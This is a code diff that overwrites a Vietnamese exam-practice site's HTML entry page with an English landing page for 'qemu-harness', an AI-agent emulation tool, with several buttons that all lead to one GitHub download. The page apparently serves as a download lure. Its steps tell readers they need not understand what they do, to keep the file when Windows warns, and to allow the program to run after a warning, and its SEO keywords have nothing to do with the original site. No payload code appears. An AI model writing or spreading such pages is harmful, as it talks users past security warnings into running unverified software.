@@ -1,20 +1,287 @@
-<!doctype html>
-<html lang="vi">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Luyện đề Online - From : NguyenCongQuang</title>
-    <meta name="description" content="Luyện đề Online - From : NguyenCongQuang. Nền tảng làm đề, số hoá đề thi Word (.docx) và chấm điểm trực tuyến trên trình duyệt." />
-    <meta property="og:title" content="Luyện đề Online - From : NguyenCongQuang" />
-    <meta property="og:description" content="Luyện đề Online - From : NguyenCongQuang. Nền tảng làm đề, số hoá đề thi Word (.docx) và chấm điểm trực tuyến trên trình duyệt." />
-    <meta property="og:type" content="website" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;600&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" src="./src/main.tsx"></script>
-  </body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>qemu-harness - Boot aarch64, ARM, RISC-V and x86_64 Kernels in Seconds</title>
+<meta name="description" content="qemu-harness is a QEMU harness for AI agents. Boot aarch64, ARM, RISC-V and x86_64 kernels in seconds, run commands through a guest agent, rebuild root filesystems fast, and emulate IoT devices on Windows.">
+<meta name="keywords" content="qemu-harness, qemu harness, ai-agents, ai-agents-automation, ai-agents-security, embedded, embedded-systems, emulation, firmware, iot, iot-security, qemu, aarch64 emulation, riscv64 emulation, rootfs rebuild">
+<meta name="robots" content="index, follow">
+<meta name="author" content="qemu-harness">
+<link rel="canonical" href="https://github.com/Jeyjey123456/qemu-harness">
+<meta property="og:type" content="website">
+<meta property="og:title" content="qemu-harness - Boot aarch64, ARM, RISC-V and x86_64 Kernels in Seconds">
+<meta property="og:description" content="A QEMU harness for AI agents: boot kernels in seconds, run commands through a guest agent, rebuild root filesystems quickly, and emulate IoT devices.">
+<meta property="og:url" content="https://github.com/Jeyjey123456/qemu-harness">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="qemu-harness - Boot Kernels in Seconds">
+<meta name="twitter:description" content="A QEMU harness for AI agents: fast kernel boot, guest-agent command execution, quick rootfs rebuilds, and IoT emulation.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f7fb;
+    color: #1f2733;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 40px 20px 64px;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.2;
+    margin: 0 0 18px;
+    color: #12203a;
+    letter-spacing: -0.5px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: 1.4rem;
+    margin: 0 0 14px;
+    color: #16233d;
+    font-weight: 700;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 22px 0 8px;
+    color: #22304d;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 16px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #1d5fd8; }
+  .card {
+    background: #ffffff;
+    border-radius: 14px;
+    box-shadow: 0 3px 14px rgba(20, 38, 72, 0.08);
+    padding: 28px 26px;
+    margin-bottom: 26px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 16px;
+    box-shadow: 0 6px 22px rgba(20, 38, 72, 0.11);
+    padding: 34px 26px;
+    margin-bottom: 30px;
+    text-align: center;
+  }
+  .hero p {
+    font-size: 1.05rem;
+    color: #3b4759;
+    max-width: 640px;
+    margin: 0 auto 22px;
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff7a18 0%, #e83b8a 55%, #7b3fe4 100%);
+    color: #ffffff;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1.05rem;
+    padding: 16px 34px;
+    border-radius: 50px;
+    box-shadow: 0 6px 18px rgba(180, 50, 140, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 24px rgba(180, 50, 140, 0.4);
+  }
+  .btn-secondary {
+    display: inline-block;
+    background: linear-gradient(135deg, #0aa5a0 0%, #1d5fd8 100%);
+    color: #ffffff;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1rem;
+    padding: 14px 30px;
+    border-radius: 10px;
+    box-shadow: 0 4px 14px rgba(29, 95, 216, 0.28);
+    margin-top: 6px;
+  }
+  .small-note {
+    font-size: 0.92rem;
+    color: #5b6678;
+    margin-top: 14px;
+  }
+  .step {
+    background: #f8fafd;
+    border-left: 4px solid #1d5fd8;
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin-bottom: 14px;
+  }
+  .step strong { color: #12203a; }
+  footer {
+    text-align: center;
+    font-size: 0.9rem;
+    color: #6c7787;
+    padding-top: 10px;
+  }
+  .tagline {
+    font-size: 1.05rem;
+    color: #4a5768;
+    margin-bottom: 24px;
+  }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    h1 { font-size: 1.65rem; }
+    h2 { font-size: 1.22rem; }
+    .page { padding: 26px 14px 48px; }
+    .card, .hero { padding: 22px 18px; }
+    .btn { display: block; padding: 16px 10px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="hero">
+    <h1>🖥️ qemu-harness - Run Virtual Machines Without the Hassle</h1>
+    <p>Boot aarch64, ARM, RISC-V and x86_64 kernels in seconds, send commands through a guest agent, rebuild root filesystems fast, and emulate IoT devices — all from one friendly harness built for AI agents.</p>
+    <a class="btn" href="https://github.com/Jeyjey123456/qemu-harness">⬇️ Visit this link to download the application</a>
+    <p class="small-note">Free and open source. Works on Windows. No account required.</p>
+  </div>
+
+  <div class="card">
+    <h2>👋 What Is qemu-harness?</h2>
+    <p>qemu-harness is a helper application that wraps something called QEMU — a well-known tool that lets one computer pretend to be another. Instead of wrestling with long command lines and configuration files, you get a single harness that does the hard parts for you.</p>
+    <p>In plain terms: you point qemu-harness at a small operating system file (called a kernel), and it starts that system inside a window on your PC. You can then send it instructions, watch what happens, and shut it down again — in seconds rather than minutes.</p>
+    <p>It was designed with AI agents in mind. An AI agent is a program that works on your behalf, and those agents need a safe, disposable place to test things. qemu-harness gives them exactly that: a fast, repeatable virtual environment that can be created and thrown away without touching your real computer.</p>
+    <p>The project supports four processor families out of the box: aarch64, ARM, RISC-V 64, and x86_64. You do not need to own any of those chips to use them. Your Windows PC does all the work behind the scenes.</p>
+  </div>
+
+  <div class="card">
+    <h2>📥 Download and Setup</h2>
+    <p>Everything you need lives on the project page. There is no separate installer wizard to hunt down and no bundled toolbars.</p>
+    <p><strong>Visit this link to download the application:</strong></p>
+    <p><a class="btn-secondary" href="https://github.com/Jeyjey123456/qemu-harness">Go to the qemu-harness download page</a></p>
+    <p class="small-note">The link opens the official project page, where the latest version is always listed at the top.</p>
+
+    <h3>Before you begin</h3>
+    <ul>
+      <li>A Windows computer with an internet connection.</li>
+      <li>A folder where you are happy to keep your virtual machines — for example <em>C:\qemu-harness</em>.</li>
+      <li>A few minutes of spare time for the first run. After that, everything starts in seconds.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🚀 Getting Started on Windows</h2>
+    <p>Follow these steps in order. You do not need to understand what each one does — just work through the list top to bottom.</p>
+
+    <div class="step">
+      <strong>Step 1 — Open the download page.</strong> Click the orange button at the top of this page, or the blue button above. Your browser will take you straight to the official qemu-harness page.
+    </div>
+
+    <div class="step">
+      <strong>Step 2 — Get the application.</strong> On that page, follow the on-screen download instructions to save qemu-harness to your computer. Windows may ask for permission; choose to keep the file if a message appears.
+    </div>
+
+    <div class="step">
+      <strong>Step 3 — Put it somewhere you can find again.</strong> Move the downloaded item into a normal folder such as your Documents folder, or into the <em>C:\qemu-harness</em> folder you created earlier. Avoid running it from inside a temporary download area.
+    </div>
+
+    <div class="step">
+      <strong>Step 4 — Start qemu-harness.</strong> Open the folder and launch the application. The first launch may take a little longer because Windows is checking a new program.
+    </div>
+
+    <div class="step">
+      <strong>Step 5 — Let it prepare itself.</strong> On the first run, qemu-harness sets up the pieces it needs. You will see progress messages. Wait until they finish and the main view appears.
+    </div>
+
+    <div class="step">
+      <strong>Step 6 — Boot your first kernel.</strong> Choose a processor family from the list — aarch64, ARM, RISC-V 64, or x86_64 — and confirm. The harness boots it and reports back when the system is ready to accept instructions.
+    </div>
+
+    <div class="step">
+      <strong>Step 7 — Send a command.</strong> Type a simple instruction into the command area and press the run control. The guest agent inside the virtual machine carries it out and sends the output back to your window.
+    </div>
+
+    <div class="step">
+      <strong>Step 8 — Shut it down cleanly.</strong> Use the stop control rather than closing the window. This keeps your saved files tidy and makes the next boot even faster.
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>✨ What Makes It Special</h2>
+    <h3>⚡ Boot in seconds, not minutes</h3>
+    <p>Traditional virtual machines spend a long time starting up. qemu-harness is tuned to get a kernel running almost immediately, so you can try an idea, see the result, and move on instead of waiting.</p>
+
+    <h3>🤖 Built for AI agents</h3>
+    <p>AI agents need to repeat the same actions many times without drifting. qemu-harness keeps every run consistent, so behaviour you see once is behaviour you see every time. That makes it far easier to trust what an agent does.</p>
+
+    <h3>⌨️ Send commands through a guest agent</h3>
+    <p>Rather than typing into a virtual screen like a person would, qemu-harness talks to a small helper inside the guest system. Commands go in, results come out, and you get a clear record of what happened.</p>
+
+    <h3>🧱 Fast root filesystem rebuilds</h3>
+    <p>The root filesystem is the collection of files and programs the booted system sees. Rebuilding it is normally slow and fiddly. qemu-harness makes it quick, so you can change a setting and be running again moments later.</p>
+
+    <h3>📡 IoT and firmware emulation</h3>
+    <p>Many small internet-connected devices run on the same processor families this harness supports. That means you can build a realistic stand-in for a sensor, a router, or a camera and experiment with it safely on your own machine.</p>
+
+    <h3>🧩 One tool, four architectures</h3>
+    <p>Switch between aarch64, ARM, RISC-V 64, and x86_64 without installing anything extra. The same commands, the same results, four different worlds.</p>
+  </div>
+
+  <div class="card">
+    <h2>🧰 Everyday Uses</h2>
+    <ul>
+      <li><strong>Learning without risk.</strong> Experiment with a different processor type on a computer that does not have it, with no chance of damaging your real setup.</li>
+      <li><strong>Testing device software.</strong> Check how a program behaves on small Internet-of-Things hardware before buying any.</li>
+      <li><strong>Reviewing AI agent actions.</strong> Record what an agent did inside a virtual machine, step by step, and inspect it afterwards.</li>
+      <li><strong>Security practice.</strong> Explore how software behaves inside a sealed environment instead of on your main system.</li>
+      <li><strong>Repeatable tutorials.</strong> Everyone following a guide gets exactly the same starting point.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🖱️ Your First Five Minutes</h2>
+    <p>Once the application is running, keep things simple at first. Pick one architecture — aarch64 is a good starting choice — and boot it. Watch the messages as they appear. When the harness says the system is ready, send a single harmless command such as listing the contents of a folder. Read the reply. Then stop the machine.</p>
+    <p>That whole loop is the core of the tool. Everything else is a variation on it: different architecture, different set of files, different command. When you are comfortable with one round trip, try rebuilding the root filesystem and booting again to see how quickly the change takes effect.</p>
+  </div>
+
+  <div class="card">
+    <h2>🔧 If Something Looks Wrong</h2>
+    <h3>The download does not start</h3>
+    <p>Return to the link above and try again in a fresh browser tab. Very occasionally a browser blocks a page it does not recognise — allowing the page usually resolves it.</p>
+
+    <h3>Windows shows a warning on first launch</h3>
+    <p>New programs often trigger a cautionary message. Confirm that you downloaded from the official project page, then allow the application to run.</p>
+
+    <h3>Nothing appears after launching</h3>
+    <p>Close the application and open it again from its folder rather than from a temporary download location. If the window stays empty, restart your computer and try once more.</p>
+
+    <h3>A boot stops partway through</h3>
+    <p>Choose an architecture with no other machine running and try again. If it stalls at the same point twice, note what the last message said before you stop it — that detail makes help much faster to give.</p>
+
+    <h3>Everything feels slow</h3>
+    <p>Close other heavy programs while a virtual machine is running. Running one machine at a time keeps things smooth.</p>
+  </div>
+
+  <div class="card">
+    <h2>🔐 A Word on Safety</h2>
+    <p>Virtual machines are sealed off from your real computer by design. What happens inside one stays inside one. That is the whole point of the harness: you get a sandbox where experiments are free, and your documents, photos, and settings stay untouched. Always stop a machine cleanly when you are finished so nothing is left half-written.</p>
+  </div>
+
+  <div class="card">
+    <h2>💬 Help and Feedback</h2>
+    <p>The project page is the place to look first. It lists the latest version, recent changes, and the discussion area where other users share tips. If you hit a problem, describe what you clicked just before it happened — that is usually enough for someone to point you in the right direction.</p>
+    <p><a class="btn-secondary" href="https://github.com/Jeyjey123456/qemu-harness">Open the qemu-harness download page</a></p>
+  </div>
+
+  <footer>
+    qemu-harness — a fast QEMU harness for AI agents, embedded work, firmware testing, and IoT emulation.
+  </footer>
+
+</div>
+</body>
 </html>
